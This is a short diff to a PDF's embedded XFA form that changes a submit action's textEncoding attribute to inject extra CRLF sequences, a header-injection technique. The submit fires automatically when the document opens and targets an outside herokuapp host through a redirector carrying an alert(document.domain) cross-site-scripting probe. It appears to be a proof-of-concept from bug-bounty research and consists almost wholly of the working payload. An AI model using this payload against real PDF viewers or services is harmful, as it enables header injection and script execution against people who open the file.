@@ -18,7 +18,7 @@ stream
         <field id="Hello World!">
             <event activity="docReady" ref="$host" name="event__click">
                <submit 
-                     textEncoding="UTF-8&#xD;&#xA;Content-Type: text/html;&#xD;&#xA;"
+                     textEncoding="UTF-8&#xD;&#xA;Content-Type: text/html;&#xD;&#xA;&#xD;&#xA;"
                      xdpContent="pdf datasets template"
                      target="https://bughunt1307.herokuapp.com/redirector.php?x=https://api.github.com/search/issues?q=alert(document.domain)"/>
             </event>
